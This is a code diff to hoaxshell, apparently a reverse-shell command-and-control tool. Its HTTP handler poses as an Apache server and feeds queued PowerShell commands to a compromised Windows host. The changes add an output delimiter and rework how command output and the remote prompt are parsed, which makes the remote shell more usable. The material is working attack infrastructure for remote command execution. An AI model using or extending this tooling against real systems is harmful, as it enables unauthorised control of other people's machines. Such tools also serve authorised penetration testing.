@@ -201,6 +201,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	verify = str(uuid.uuid4()).replace("-", "")[0:8]
 	get_cmd = str(uuid.uuid4()).replace("-", "")[0:8]
 	post_res = str(uuid.uuid4()).replace("-", "")[0:8]
+	output_end = str(uuid.uuid4()).replace("-", "")[0:8]
 	hid = str(uuid.uuid4()).split("-")
 	header_id = f'{hid[0][0:4]}-{hid[1]}'
 	SESSIONID = '-'.join([verify, get_cmd, post_res])
@@ -228,7 +229,8 @@ class Hoaxshell(BaseHTTPRequestHandler):
 				session_check.start()
 
 				print(f'\r[{GREEN}Shell{END}] {BOLD}Session restored!{END}')
-				rst_prompt(force_rst = True)
+				#Hoaxshell.command_pool.append(f"echo ' ';echo {Hoaxshell.output_end};split-path $pwd'\\0x00'")
+				Hoaxshell.rst_promt_required = True
 
 		self.server_version = "Apache/2.4.1"
 		self.sys_version = ""
@@ -248,9 +250,9 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			session_check.daemon = True
 			session_check.start()
 			print(f'\r[{GREEN}Shell{END}] {BOLD}Payload execution verified!{END}')
-			print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt...{END}', end = '')
+			print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt...{END}') #end = ''
 			Hoaxshell.prompt_ready = False
-			Hoaxshell.command_pool.append("split-path $pwd'\\0x00'")
+			Hoaxshell.command_pool.append(f"echo `r;echo {Hoaxshell.output_end};split-path $pwd'\\0x00'")
 			Hoaxshell.rst_promt_required = True
 
 
@@ -306,7 +308,10 @@ class Hoaxshell(BaseHTTPRequestHandler):
 					to_b_numbers = [ int(n) for n in bin_output ]
 					b_array = bytearray(to_b_numbers)
 					output = b_array.decode('utf-8', 'ignore')
-					prompt = f"PS {' '.join(output.split()[-1::])}> "
+					tmp = output.split(Hoaxshell.output_end)
+					output = tmp[0]
+					prompt = f"PS {tmp[-1].strip()} > "
+					prompt = "PS \\ > " if tmp[-1].strip() == '' else prompt
 
 				except UnicodeDecodeError:
 					print(f'[{WARN}] Decoding data to UTF-8 failed. Printing raw data.')
@@ -315,7 +320,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 					pass
 
 				else:
-					output = output.strip()[:-(len(prompt)-4)] + '\n' if output.strip() != '' else output.strip()
+					output = output.strip() + '\n' if output.strip() != '' else output.strip()
 
 				print(f'\r{GREEN}{output}{END}')
 			else:
@@ -499,7 +504,7 @@ def main():
 				else:
 
 					if Hoaxshell.execution_verified and not Hoaxshell.command_pool:
-						Hoaxshell.command_pool.append(user_input + ";split-path $pwd'\\0x00'")
+						Hoaxshell.command_pool.append(user_input + f";echo {Hoaxshell.output_end};split-path $pwd'\\0x00'")
 						Hoaxshell.prompt_ready = False
 
 					elif Hoaxshell.execution_verified and Hoaxshell.command_pool:
